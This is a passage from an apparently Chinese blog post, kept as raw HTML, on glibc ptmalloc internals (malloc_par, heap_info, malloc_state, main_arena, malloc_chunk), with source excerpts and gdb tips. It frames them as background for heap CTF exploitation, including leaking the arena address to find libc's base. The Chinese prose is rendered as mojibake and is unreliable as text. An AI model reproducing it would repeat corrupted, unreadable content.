class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  <span class="hljs-comment">/* Tunable parameters */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;  <br>  INTERNAL_SIZE_T top_pad;  <br>  INTERNAL_SIZE_T mmap_threshold;  <br>  INTERNAL_SIZE_T arena_test;  <br>  INTERNAL_SIZE_T arena_max;  <br>  <br>  <span class="hljs-comment">/* Memory map support */</span>  <br>  <span class="hljs-type">int</span> n_mmaps;  <br>  <span class="hljs-type">int</span> n_mmaps_max;  <br>  <span class="hljs-type">int</span> max_n_mmaps;  <br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets  </span><br><span class="hljs-comment">     it manually, at which point we need to disable any     </span><br><span class="hljs-comment">     dynamic behavior. */</span>  <br>  <span class="hljs-type">int</span> no_dyn_threshold;  <br>  <br>  <span class="hljs-comment">/* Statistics */</span>  <br>  INTERNAL_SIZE_T mmapped_mem;  <br>  INTERNAL_SIZE_T max_mmapped_mem;  <br>  <br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span>  <br>  <span class="hljs-type">char</span> *sbrk_base;  <br>  <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE  </span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_bins;  <br>  <span class="hljs-type">size_t</span> tcache_max_bytes;  <br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_count;  <br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which  </span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>malloc_par</code>ç»“æ„ä½“å®šä¹‰äº†å’Œ<code>mmap</code>å’Œ<code>arena</code>ç›¸å…³çš„ä¸€äº›å‚æ•°ï¼Œä»¥åŠ<code>sbrk</code>çš„åŸºå€ï¼Œå…¶ä¸­é‡è¦çš„å‚æ•°è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li><code>top_pad</code>ï¼šåˆå§‹åŒ–æˆ–æ‰©å±•å †çš„æ—¶å€™éœ€è¦å¤šç”³è¯·çš„å†…å­˜å¤§å°ã€‚</li><li><code>mmap_threshold</code>ï¼šå†³å®š<code>sysmalloc</code>æ˜¯é€šè¿‡<code>mmap</code>æˆ–<code>sbrk</code>åˆ†é…å†…å­˜çš„ç•Œé™ï¼Œå³å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸å°äºè¯¥å€¼åˆ™é‡‡ç”¨<code>mmap</code>åˆ†é…ï¼Œå¦åˆ™é‡‡ç”¨<code>sbrk</code>æ‰©å±•<code>heap</code>åŒºåŸŸåˆ†é…ã€‚å¹¶ä¸”è¿™ä¸ªå€¼æ˜¯åŠ¨æ€è°ƒæ•´çš„ï¼Œå¦‚æœé‡Šæ”¾çš„å†…å­˜æ˜¯é€šè¿‡<code>mmap</code>å¾—åˆ°çš„åˆ™<code>mmap_threshold</code>ä¸è¯¥å†…å­˜å¤§å°å–<code>max</code>ã€‚å¹¶ä¸”<code>mmap_threshold</code>æœ€å¤§ä¸èƒ½è¶…è¿‡<code>DEFAULT_MMAP_THRESHOLD_MAX</code>ï¼Œå³ 0x2000000ã€‚</li><li><code>trim_threshold</code>ï¼šç”¨äº<code>main_arena</code>ä¸­ä¿ç•™å†…å­˜é‡çš„æ§åˆ¶ã€‚å½“é‡Šæ”¾çš„<code>chunk</code>ä¸º<code>mmap</code>è·å¾—çš„ï¼ŒåŒæ—¶å¤§å°å¤§äº<code>mmap_threshold</code>ï¼Œåˆ™é™¤äº†æ›´æ–°<code>mmap_threshold</code>å¤–è¿˜ä¼šå°†<code>trim_threshold</code>ä¹˜2ã€‚å½“é‡Šæ”¾çš„<code>chunk</code>å¤§å°ä¸åœ¨<code>fast bin</code>èŒƒå›´åˆå¹¶å®Œ<code>size</code>å¤§äº<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>å³0x10000ï¼Œä¼šæ ¹æ®è¯¥å­—æ®µç¼©å°<code>top chunk</code>ã€‚</li><li><code>n_mmaps</code>ï¼š<code>mmap</code>çš„å†…å­˜æ•°é‡ï¼Œå³ ptmalloc æ¯æ¬¡æˆåŠŸ<code>mmap</code>åˆ™<code>n_mmpas</code>åŠ  1ï¼Œptmalloc æ¯æ¬¡æˆåŠŸ<code>munmap</code>åˆ™<code>n_mmaps</code>å‡1ã€‚</li><li><code>n_mmaps_max</code>ï¼š<code>n_mmaps</code>çš„ä¸Šé™ï¼Œå³æœ€å¤šèƒ½<code>mmap</code>çš„å†…å­˜æ•°é‡ã€‚</li><li><code>max_n_mmaps</code>ï¼š<code>n_mmaps</code>è¾¾åˆ°è¿‡çš„æœ€å¤§å€¼ã€‚</li><li><code>mmapped_mem</code>ï¼šå½“å‰<code>mmap</code>çš„å†…å­˜å¤§å°æ€»å’Œã€‚</li><li><code>max_mmapped_mem</code>ï¼š<code>mmap</code>çš„å†…å­˜å¤§å°æ€»å’Œè¾¾åˆ°è¿‡çš„æœ€å¤§å€¼ã€‚</li><li><code>sbrk_base</code>ï¼šè¡¨ç¤ºé€šè¿‡<code>brk</code>ç³»ç»Ÿè°ƒç”¨ç”³è¯·çš„<code>heap</code>åŒºåŸŸçš„èµ·å§‹åœ°å€ã€‚</li><li><code>no_dyn_threshold</code>ï¼šè¡¨ç¤ºæ˜¯å¦ç¦ç”¨<code>heap</code>åŠ¨æ€è°ƒæ•´ä¿ç•™å†…å­˜çš„å¤§å°ï¼Œé»˜è®¤ä¸º0ã€‚</li></ul><p>è¯¥ç»“æ„ä½“ç±»å‹çš„å®ä¾‹<code>mp_</code>ç”¨ä»¥è®°å½• ptmalloc ç›¸å…³å‚æ•°ï¼ŒåŒæ ·å®šä¹‰äº<code>malloc.h</code>ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>2.23</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span>  <br>&#123;  <br>  .top_pad = DEFAULT_TOP_PAD,  <br>  .n_mmaps_max = DEFAULT_MMAP_MAX,  <br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  <br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)  <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE  </span><br>  ,  <br>  .tcache_count = TCACHE_FILL_COUNT,  <br>  .tcache_bins = TCACHE_MAX_BINS,  <br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),  <br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span>  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ gdb è°ƒè¯•æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>p mp_</code>å‘½ä»¤æŸ¥çœ‹è¯¥å®ä¾‹å€¼ã€‚</p><p>æˆ–è€…å¯ä»¥é€šè¿‡<code>display mp_</code>å‘½ä»¤æ¥åŠ¨æ€æŸ¥çœ‹æ‰€æœ‰<code>malloc_par</code>å­—æ®µçš„å€¼</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p><code>heap_info</code>ä½äºä¸€ä¸ª<code>heap</code>å—çš„å¼€å¤´ï¼Œç”¨ä»¥è®°å½•é€šè¿‡<code>mmap</code>ç³»ç»Ÿè°ƒç”¨ä» Memory Mapping Segment å¤„ç”³è¯·åˆ°çš„å†…å­˜å—çš„ä¿¡æ¯ã€‚å®šä¹‰äº<code>arena.c</code>ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* A heap is a single contiguous memory region holding (coalesceable)</span><br><span class="hljs-comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span><br><span class="hljs-comment">   address aligned to HEAP_MAX_SIZE.  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p><code>heap_info</code>ç»“æ„ä½“çš„æˆå‘˜å¦‚ä¸‹ï¼š</p><ul><li><code>ar_ptr</code>ï¼šæŒ‡å‘ç®¡ç†è¯¥å †å—çš„<code>arena</code></li><li><code>prev</code>ï¼šè¯¥<code>heap_info</code>æ‰€é“¾æ¥çš„ä¸Šä¸€ä¸ª<code>heap_info</code></li><li><code>size</code>ï¼šè®°å½•è¯¥å †å—çš„å¤§å°</li><li><code>mprotect_size</code>ï¼šè®°å½•è¯¥å †å—ä¸­è¢«ä¿æŠ¤ï¼ˆ<code>mprotected</code>ï¼‰çš„å¤§å°ã€‚</li><li><code>pad</code>ï¼šå³<code>padding</code>ï¼Œç”¨ä»¥åœ¨<code>SIZE_SZ</code>ä¸æ­£å¸¸çš„æƒ…å†µä¸‹è¿›è¡Œå¡«å……ä»¥è®©å†…å­˜å¯¹é½ï¼Œæ­£å¸¸æƒ…å†µä¸‹<code>pad</code>æ‰€å ç”¨ç©ºé—´åº”ä¸º0å­—èŠ‚ã€‚</li></ul><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹äºæ¯ä¸ªçº¿ç¨‹è€Œè¨€å…¶éƒ½ä¼šå•ç‹¬æœ‰ç€ä¸€ä¸ª<code>arena</code>å®ä¾‹ç”¨ä»¥ç®¡ç†å±äºè¯¥çº¿ç¨‹çš„å †å†…å­˜åŒºåŸŸã€‚</p><p><code>ptmalloc</code>å†…éƒ¨çš„å†…å­˜æ± æ˜¯ç”±<code>malloc_state</code>ç»“æ„ä½“è¿›è¡Œå®šä¹‰çš„ï¼Œå³<code>arena</code>æœ¬èº«ä¾¿ä¸º<code>malloc_state</code>çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡ã€‚</p><p><code>malloc_state</code>ç»“æ„ä½“å®šä¹‰äº<code>malloc.c</code>ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//NFASTBINSå®ç”¨äºè®¡ç®—fastbinæ•°ç»„çš„å¤§å°</span><br>  <span class="hljs-comment">//#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span><br>  <br>  <span class="hljs-comment">//MAX_FAST_SIZEæ˜¯glibcä¸­å®šä¹‰çš„æœ€å¤§fastbinå¤§å°ï¼Œé€šå¸¸ä¸ºä¸€ä¸ªå¸¸é‡</span><br>  <span class="hljs-comment">//#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br>  <span class="hljs-comment">//64ä½ä¸‹ä¸º160,32ä½ä¸º80  </span><br>  <br>  <span class="hljs-comment">//é¦–å…ˆé€šè¿‡request2sizeå°†ç”³è¯·çš„å†…å­˜å¤§å°è½¬åŒ–ä¸ºåˆé€‚çš„chunkå¤§å°</span><br>  <span class="hljs-comment">/*#define request2size(req) \</span><br><span class="hljs-comment">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ? \</span><br><span class="hljs-comment">   MINSIZE : \</span><br><span class="hljs-comment">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-comment">//64ä½ç»“æœä¸º172ï¼Œ32ä½ç»“æœä¸º84</span><br>  <span class="hljs-comment">//ç„¶åé€šè¿‡fastbin_indexè®¡ç®—chunk sizeå¯¹åº”çš„fastbinç´¢å¼•</span><br>  <span class="hljs-comment">//32ä½ç»“æœä¸º9ï¼Œ64ä½ç»“æœä¹Ÿä¸º9</span><br><br>  <span class="hljs-comment">//å®é™…ä¸ŠfastbinYæ•°ç»„çš„å¤§å°æ˜¯10ï¼Œè¿™æ˜¯å› ä¸ºé¢å¤–ä¿ç•™äº†ä¸€ä¸ªä½ç½®ç”¨äºå…¶å®ƒç‰¹æ®Šç›®çš„</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  <span class="hljs-comment">//NBINSæ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œå€¼ä¸º128</span><br>  <span class="hljs-comment">//bins[254]</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-comment">//BINMAPSIZE (NBINS / BITSPERMAP)</span><br>  <span class="hljs-comment">//ç»“æœä¸º4</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªarena</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆ</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  <span class="hljs-comment">//åœ¨å¤šçº¿ç¨‹å†…å­˜ç®¡ç†ä¸­ï¼Œè®°å½•å½“å‰æœ‰å¤šå°‘ä¸ªçº¿ç¨‹ä¸ç‰¹å®šçš„arenaç›¸å…³è”</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_lock_define (, mutex);  <br>  <br><span class="hljs-comment">/* Flags (formerly in max_fast).  */</span>  <br><span class="hljs-type">int</span> flags;  <br>  <br><span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>  <br><span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span>  <br><span class="hljs-type">int</span> have_fastchunks;<br></code></pre></td></tr></table></figure><p><code>malloc_state</code>ç»“æ„ä½“çš„æˆå‘˜å¦‚ä¸‹ï¼š</p><ul><li><code>mutex</code>ï¼š<code>mutex</code>å˜é‡å³ä¸ºå¤šçº¿ç¨‹äº’æ–¥é”ï¼Œç”¨ä»¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚</li><li><code>flags</code>ï¼šæ ‡å¿—ä½ï¼Œç”¨ä»¥è¡¨ç¤º<code>arena</code>çš„ä¸€äº›çŠ¶æ€ï¼Œå¦‚ï¼šæ˜¯å¦æœ‰<code>fastbin</code>ã€å†…å­˜æ˜¯å¦è¿ç»­ç­‰ã€‚</li><li><code>fastbinY</code>ï¼šå­˜æ”¾ fastbin chunkçš„æ•°ç»„ï¼Œä¸€å…±æœ‰10ä¸ªfastbin chunkã€‚</li><li><code>top</code>ï¼šæŒ‡å‘<code>Top chunk</code>çš„æŒ‡é’ˆã€‚</li><li><code>last_remainder</code>ï¼š<code>chunk</code>åˆ‡å‰²ä¸­çš„å‰©ä½™éƒ¨åˆ†ã€‚<code>malloc</code>åœ¨åˆ†é…<code>chunk</code>æ—¶è‹¥æ˜¯æ²¡æ‰¾åˆ°<code>size</code>åˆé€‚çš„<code>chunk</code>è€Œæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ª<code>size</code>æ›´å¤§çš„<code>chunk</code>ï¼Œåˆ™ä¼šä»å¤§<code>chunk</code>ä¸­åˆ‡å‰²æ‰ä¸€å—è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„é‚£ä¸€å—ä¾¿æ˜¯<code>last_remainder</code>ï¼Œå…¶éšåä¼šè¢«æ”¾å…¥<code>unsorted bin</code>ä¸­ã€‚</li><li><code>bins</code>ï¼šå­˜æ”¾é—²ç½®<code>chunk</code>çš„æ•°ç»„ã€‚<code>bins</code>åŒ…æ‹¬<code>large bin</code>ï¼Œ<code>small bin</code>å’Œ<code>unsorted bin</code>ã€‚</li><li><code>binmap</code>ï¼šè®°å½•<code>bin</code>æ˜¯å¦ä¸ºç©ºçš„<code>bitset</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯<code>chunk</code>è¢«å–å‡ºåè‹¥ä¸€ä¸ª<code>bin</code>ç©ºäº†å¹¶ä¸ä¼šç«‹å³è¢«ç½®0ï¼Œè€Œä¼šåœ¨ä¸‹ä¸€æ¬¡éå†åˆ°æ—¶é‡æ–°ç½®ä½ã€‚</li><li><code>system_mem</code>ï¼šè®°å½•å½“å‰<code>arena</code>åœ¨å †åŒºä¸­æ‰€åˆ†é…åˆ°çš„å†…å­˜çš„æ€»å¤§å°ã€‚</li><li><code>max_system_mem</code>ï¼šå½“æ“ä½œç³»ç»Ÿäºˆè¿›ç¨‹ä»¥å†…å­˜æ—¶ï¼Œ<code>system_mem</code>ä¼šéšä¹‹å¢å¤§ï¼Œå½“å†…å­˜è¢«è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿæ—¶ï¼Œ<code>system_mem</code>ä¼šéšä¹‹å‡å°ï¼Œ<code>max_system_mem</code>å˜é‡ä¾¿æ˜¯ç”¨æ¥è®°å½•åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­<code>system_mem</code>çš„å³°å€¼ã€‚</li></ul><p>åœ¨gdbè°ƒè¯•ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>p &amp;main_arena</code>æ¥æŸ¥çœ‹<code>main arena</code></p><p><code>main_arena</code>ä¸ºä¸€ä¸ªå®šä¹‰äº<code>malloc.c</code>ä¸­çš„é™æ€çš„<code>malloc_state</code>ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç”±äºå…¶ä¸º libc ä¸­çš„é™æ€å˜é‡ï¼Œè¯¥<code>arena</code>ä¼šéšç€ libc æ–‡ä»¶ä¸€åŒåŠ è½½åˆ° Memory Mapping Segmentã€‚å› æ­¤åœ¨å †é¢˜ä¸­é€šå¸¸é€šè¿‡æ³„éœ²<code>arena</code>çš„åœ°å€ä»¥è·å¾— libc åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ã€‚</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>åœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç§°ç”±<code>malloc</code>ç”³è¯·çš„å†…å­˜ä¸º<code>chunk</code>ã€‚è¿™å—å†…å­˜åœ¨<code>ptmalloc</code>å†…éƒ¨ç”¨<code>malloc_chunk</code>ç»“æ„ä½“æ¥è¡¨ç¤ºã€‚å½“ç¨‹åºç”³è¯·çš„<code>chunk</code>è¢«<code>free</code>åï¼Œä¼šè¢«åŠ å…¥åˆ°ç›¸åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ã€‚</p><p>æˆ‘ä»¬åœ¨mallocä¸€å—å†…å­˜çš„æ—¶å€™è¿”å›ç»™æˆ‘ä»¬çš„æŒ‡é’ˆæ˜¯æŒ‡å‘user dataçš„æŒ‡é’ˆ</p><p><code>malloc_chunk</code>å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¯ä¸ªå­—æ®µçš„å…·ä½“çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li><code>prev_size</code>ï¼šå¦‚æœç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€<code>chunk</code>æ˜¯ç©ºé—²çš„è¯ï¼Œé‚£è¯¥å­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ª<code>chunk</code>çš„å¤§å°ï¼ˆåŒ…æ‹¬<code>chunk</code>å¤´ï¼‰ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µå¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ª<code>chunk</code>çš„æ•°æ®ã€‚</li><li><code>size</code>ï¼šè¯¥<code>chunk</code>çš„å¤§å°ï¼Œå¤§å°å¿…é¡»æ˜¯<code>2 * 